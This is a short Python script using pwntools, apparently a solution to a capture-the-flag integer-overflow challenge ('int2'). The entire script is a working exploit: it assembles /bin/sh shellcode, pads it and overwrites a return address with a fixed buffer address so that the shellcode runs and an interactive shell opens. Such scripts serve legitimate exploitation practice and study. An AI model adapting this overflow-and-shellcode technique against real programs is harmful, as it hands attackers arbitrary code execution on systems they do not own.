from pwn import *

p = process('./pwn/integer/int-2/int2')

context.arch="i386"
# context.log_level = 'debug'
context.terminal=["tmux","splitw","-h"]
# gdb.attach(p, "b* 0x0804851B")

passwd_buf_addr = 0x804C060 
shellcode = shellcraft.sh()

print(p.recvuntil(b"passwd:\n"))
payload = asm(shellcode).ljust(0x3b+4, b'a')+p32(passwd_buf_addr)+b'a'*194  #63+4+194=261
p.sendline(payload)
print(p.recvline())
p.interactive()